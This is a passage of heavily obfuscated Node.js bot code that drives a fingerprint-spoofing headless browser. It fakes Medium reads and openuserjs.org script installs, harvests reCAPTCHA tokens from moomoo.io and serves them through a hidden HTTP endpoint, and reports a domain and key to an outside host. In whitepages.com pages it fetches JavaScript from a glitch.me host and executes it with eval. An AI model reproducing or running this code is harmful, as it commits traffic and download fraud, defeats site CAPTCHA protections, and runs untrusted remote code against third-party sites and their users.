      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x14, 'J8Gl') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + X(0x11) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    W(0xc) + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    X(0x15) + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + W(0x4) + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2115 * 0x1 + 0x14 * -0xa7 + -0x7 * -0x697
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x7a * -0x47 + -0x3 * -0x7f + 0x2059)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0x1f7d + -0xc * 0x293 + 0x1 * -0x35), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2199 + 0xbfa + -0x2b * 0x10d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x26 * -0x57 + -0x15de + 0x22c8;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x26b9 + 0x17 * 0x85 + -0x32ac; w < getRandomInt(0x21c + 0x9a3 * 0x1 + -0xbbe, 0x11d1 + 0x1159 + 0x2325 * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x75e8 + -0x1a94e + -0x184cb * -0x2);
        }
      }();
    }, 0x152 + -0x37d + 0x1 * 0x28f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x3 * -0x643 + 0x19b * -0x6 + 0xd5 * -0xb;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + Y(0x5, 'p)3x') + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0x89 + -0xc68 + 0xcf1, 0x1 * 0x1f73 + 0x1bac + -0x7 * 0x86b)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x208a + 0x98ec + -0x332);
    }, 0x70a + 0x158d + -0x1c33), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * -0x24b5 + 0x139d + -0x3852;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x4 * 0x946 + 0x1 * 0x26bf + -0x401f), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x5 * -0x208 + -0x256d + 0x1 * 0x1b45), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x191c0c + -0x203b5 + -0x402b * -0xa3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x6 * 0x4fe + -0x8b * 0x43 + 0x1 * 0x6d1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a0 = c,
      Z = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xa5b + -0x2653 + 0xe60 * 0x2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + Z(0x12) + 'dwqd' == i ? h[a0(0x8)](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x294d + -0x55b * -0xa + -0x3f4b);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * -0x1042 + -0xbc6 + 0x34 * 0x8a);
    let h = e[f];
    if (b['CnRfbF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x3 * 0x8be + 0x165 * -0x2 + -0x1770, s, t, u = 0x1d3 + -0x25de + 0x240b; t = n['charAt'](u++); ~t && (s = r % (-0x2710 + 0x2bb + 0x1 * 0x2459) ? s * (-0x21ba + -0x2 * -0xdfc + 0x602) + t : t, r++ % (0xce2 * -0x3 + -0x1286 * -0x1 + 0x1424)) ? p += String['fromCharCode'](0x21d9 + -0x760 * -0x4 + -0x3e5a & s >> (-(0x1119 * -0x2 + 0x1 * 0x1693 + 0xba1) * r & -0x66 + 0x7c6 + -0x3ad * 0x2)) : -0x1 * 0x8db + -0x374 + 0x89 * 0x17) {
          t = o['indexOf'](t);
        }
        for (let v = 0x209 * 0xc + 0x1feb * 0x1 + -0x3857, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x25 * 0xe9 + -0x1 * -0x138b + 0x48 * -0xbd))['slice'](-(0x12f5 * -0x1 + 0x2589 + 0x1 * -0x1292));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xd * -0x2e1 + -0xba * 0xc + 0x1 * 0x2e25,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x16ed + 0x32 * -0xc8 + 0x3dfd; u < 0x1e7 * -0xc + -0x7ba + 0x1f8e; u++) {
          p[u] = u;
        }
        for (u = 0x6 * 0x5f7 + -0xb57 * 0x1 + -0xb * 0x239; u < -0x20 * 0xb2 + 0xd * 0x1c9 + -0xb * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x8 * -0xef + 0x6c0 + -0xd38), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0xafd + -0x511 * -0x7 + -0x2e74, q = -0xaef + -0x11 * 0x2f + 0xe0e;
        for (let v = 0x2482 + 0x4a * 0x2e + -0x31ce; v < n['length']; v++) {
          u = (u + (0x29a + 0xb7f * -0x2 + -0x1465 * -0x1)) % (0x12d2 + -0x10 * -0xda + 0x47e * -0x7), q = (q + p[u]) % (0xd05 * -0x3 + -0x148f + 0x3c9e), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xcff * -0x1 + 0xeb6 + -0xb7)]);
        }
        return t;
      };
      b['FCeEGc'] = m, c = arguments, b['CnRfbF'] = !![];
    }
    const j = e[-0x1191 + 0x988 * 0x2 + -0x17f],
      k = f + j,
      l = c[k];
    return !l ? (b['qmoTyo'] === undefined && (b['qmoTyo'] = !![]), h = b['FCeEGc'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = b,
    a3 = d;
  async function f() {
    const a2 = c,
      a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1 * 0x143b + -0xd2a + 0x2166) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x3 * -0x80e + -0x2034 + -0x1 * -0x385f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x20ac + -0xa34 + 0x2ae0, D['indexOf']('\x20'));
        return B ? E['slice'](0x85a + 0x1d1 + -0xa2b, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4dae + -0x1 * -0x4537 + 0x2f87),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x581 * 0x4 + -0x16f * 0x35 + 0x890f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + a1(0x7) + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + a2(0x9) + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + a3(0xa) + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + a4(0x6, 'VJ@S'),
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x908 + 0x18d1 * -0x1 + 0x21d9; k < -0x11f * 0x5 + 0xc * 0x2f0 + -0xcd * 0x25; k++)
    setTimeout(f, (-0x4c3 * -0x56 + -0x1aec * 0xd + 0x2 * 0x576d) * k * getRandomInt(-0x156d * -0x1 + 0x1216 + -0x30a * 0xd, -0x19b9 + 0x1f16 * 0x1 + -0x55a));
  setInterval(() => {
    f();
    for (let l = 0x4 * -0x60a + 0x26e4 + -0xebc; l < -0x269e * 0x1 + -0x960 + 0x5 * 0x99a; l++)
      setTimeout(f, (-0x3fd * -0x5b + 0x1a46e + -0xed * 0x251) * l * getRandomInt(-0x112a + 0x8f7 + 0x834, 0x1d * 0x101 + 0x2b * -0x9f + -0x265));
  }, 0x7 * -0x736ff + -0x2 * 0x1fc9f1 + 0xa9035b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
